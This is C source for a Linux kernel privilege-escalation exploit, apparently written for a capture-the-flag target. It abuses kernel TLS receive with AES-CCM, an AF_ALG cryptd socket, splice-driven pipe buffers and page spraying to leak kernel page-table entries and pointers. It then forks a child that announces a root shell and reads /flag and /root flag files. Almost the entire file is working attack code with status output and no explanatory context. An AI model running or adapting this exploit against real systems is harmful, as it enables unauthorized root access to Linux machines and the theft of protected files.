#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/if_alg.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <err.h>
#include <linux/tls.h>

#define EXPLOIT_PORT 4444

void setup_cpu_affinity(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

void setup_tls(int sock)
{
	struct tls12_crypto_info_aes_ccm_128 crypto = {0};
	crypto.info.version = TLS_1_2_VERSION;
	crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;
	setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls"));
	setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto));
}

void print_exploit_status(const char *stage)
{
	fprintf(stderr, "\n[===] %s\n", stage);
	fprintf(stderr, "[===] PID: %d, UID: %d, GID: %d\n", getpid(), getuid(), getgid());
	fflush(stderr);
}

void vuln_trigger()
{
	print_exploit_status("VULNERABILITY TRIGGERED");
	puts("Root shell !!");
	fflush(stdout);
	
	usleep(200000);
	
	// Try to read flag immediately
	fprintf(stderr, "\n[+++] Attempting immediate flag read...\n");
	fflush(stderr);
	system("cat /flag 2>&1 | head -20");
	system("cat /root/rce_flag 2>&1 | head -20");
	system("cat /root/flag 2>&1 | head -20");
	
	/* Trigger crash */
	*(size_t *)0 = 0;
}

int main(int argc, char **argv)
{
	int listener, conn, client;
	static char buf[0x100000];
	static char *addrs[0x400];

	print_exploit_status("EXPLOIT START");

	int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type = "aead",
		.salg_name = "cryptd(ccm(aes))",
	};
	
	char *maddr = (void *)0x200000;
	
	fprintf(stderr, "[*] Allocating 0x400 pages (1MB stride)...\n");
	fflush(stderr);
	for (int i = 0; i < 0x400; i++) {
		addrs[i] = mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
		if (addrs[i] == MAP_FAILED) {
			fprintf(stderr, "[!] mmap failed at index %d\n", i);
			fflush(stderr);
			break;
		}
	}
	fprintf(stderr, "[*] Memory allocation complete\n");
	fflush(stderr);

	bind(sock, (struct sockaddr *)&sa, sizeof(sa));
	
	struct sockaddr_in addr = {0};
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setup_cpu_affinity(0);

	listener = socket(AF_INET, SOCK_STREAM, 0);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(EXPLOIT_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	bind(listener, (struct sockaddr *)&addr, sizeof(addr));
	listen(listener, 1);

	client = socket(AF_INET, SOCK_STREAM, 0);
	connect(client, (struct sockaddr *)&addr, sizeof(addr));

	printf("[*] Client connected\n");
	fflush(stdout);
	
	conn = accept(listener, NULL, 0);
	printf("[*] Server accepted\n");
	fflush(stdout);
	
	int dummy_serv = socket(AF_INET, SOCK_STREAM, 0);
	connect(dummy_serv, (struct sockaddr *)&addr, sizeof(addr));
	int dummy_cli = accept(listener, 0, 0);

	setup_tls(client);

	unsigned char tls_record[] = {
		0x17, 0x03, 0x03, 0x00, 0x23,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x6e, 0xc7, 0x5f, 0xb2,
		0xe2, 0xb4, 0x87, 0x46,
		0x1e, 0xdd, 0xcb, 0xc6,
		0x92, 0xb4, 0x54, 0x7a,
		0xae, 0xa5, 0x16, 0xe7,
		0x7a, 0x2e, 0x5c, 0xd9,
		0xac, 0x9a, 0x46};

	int pfd[2];
	pipe(pfd);

	fprintf(stderr, "[*] Exploit chain setup\n");
	fflush(stderr);

	write(pfd[1], tls_record, sizeof(tls_record));
	write(pfd[1], buf, 0x800 - sizeof(tls_record));

	int n = splice(pfd[0], 0, conn, 0, 0x300, 0);
	write(dummy_cli, buf, 1);

	char *ro = mmap(NULL, 0x100000, PROT_READ, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	fprintf(stderr, "[*] Executing exploit chain\n");
	fflush(stderr);

	n = recv(client, ro, 0x100000, 0);

	addr.sin_family = AF_UNSPEC;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = 0;
	connect(client, &addr, sizeof(addr));

	read(dummy_serv, buf, 1);
	read(pfd[0], buf, 0x800 - sizeof(tls_record));

	fprintf(stderr, "[*] Reclamation phase\n");
	fflush(stderr);
	for (int i = 0; i < 3; i++) {
		n = recv(client, buf, 0x100000, 0);
		usleep(100000);
	}

	write(pfd[1], buf, 0x600);

	fprintf(stderr, "[*] Page table touching\n");
	fflush(stderr);
	int sum = 0;
	for (int i = 0; i < 0x400; i++) {
		if (addrs[i]) {
			for (int j = 0; j < 0x1000/8; j += 256) {
				sum += addrs[i][j];
			}
		}
	}
	(void)sum;

	read(pfd[0], buf, 0x600);

	printf("pte? %zx\n", *(size_t *)buf);
	fflush(stdout);
	
	fprintf(stderr, "\n[===] KERNEL MEMORY LEAK RESULT [===]\n");
	fprintf(stderr, "Raw PTE: 0x%zx\n", *(size_t *)buf);
	
	// Dump first 512 bytes for analysis
	fprintf(stderr, "\n[===] BUFFER DUMP (first 256 bytes):\n");
	for (int i = 0; i < 256; i += 16) {
		fprintf(stderr, "%03x: ", i);
		for (int j = 0; j < 16; j++) {
			fprintf(stderr, "%02x ", (unsigned char)buf[i+j]);
		}
		fprintf(stderr, "\n");
	}
	fflush(stderr);

	// Check if we have any kernel pointers
	fprintf(stderr, "\n[===] POTENTIAL KERNEL POINTERS:\n");
	for (int i = 0; i < 2048; i += 8) {
		size_t val = *(size_t *)&buf[i];
		// Kernel pointers usually start with 0xffffffff8... or 0xffffea00...
		if ((val & 0xffff000000000000ULL) == 0xffff000000000000ULL ||
		    (val & 0xffffffff00000000ULL) == 0xffffffff00000000ULL) {
			fprintf(stderr, "  buf[0x%x] = 0x%zx\n", i, val);
		}
	}
	fflush(stderr);

	fprintf(stderr, "\n[*] Forking to trigger vulnerability...\n");
	fflush(stderr);
	
	if (fork() == 0) {
		setsid();
		vuln_trigger();
	} else {
		fprintf(stderr, "[*] Parent waiting 4 seconds...\n");
		fflush(stderr);
		sleep(4);
		fprintf(stderr, "[*] Exploit complete. Check dmesg for results.\n");
		fflush(stderr);
	}

	return 0;
}
